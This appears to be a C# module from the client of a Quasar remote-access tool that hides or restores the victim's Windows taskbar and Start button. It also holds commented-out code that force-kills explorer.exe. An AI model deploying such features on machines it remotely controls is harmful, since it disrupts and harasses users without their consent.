using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Quasar.Client.FunStuff
{
    public static class HideTaskbar
    {
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;

        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        public static void DoHideTaskbar()
        {
            int taskbarHandle = FindWindow("Shell_TrayWnd", "");
            int startButtonHandle = FindWindow("Button", "Start");

            if (taskbarHandle != 0)
            {
                int taskbarState = ShowWindow(taskbarHandle, SW_HIDE);
                int startButtonState = ShowWindow(startButtonHandle, SW_HIDE);

                if (taskbarState == 0 && startButtonState == 0)
                {
                    ShowWindow(taskbarHandle, SW_SHOW);
                    ShowWindow(startButtonHandle, SW_SHOW);
                }
            }

            //Process[] explorer = Process.GetProcessesByName("explorer");
            //if (explorer.Length > 0)
            //{
            //    Debug.WriteLine("Explorer is running");
            //    Process.Start("taskkill", "/f /im explorer.exe");
            //}
            //else
            //{
            //    Debug.WriteLine("Starting explorer");
            //    Process.Start("explorer.exe");
            //}
        }
    }
}
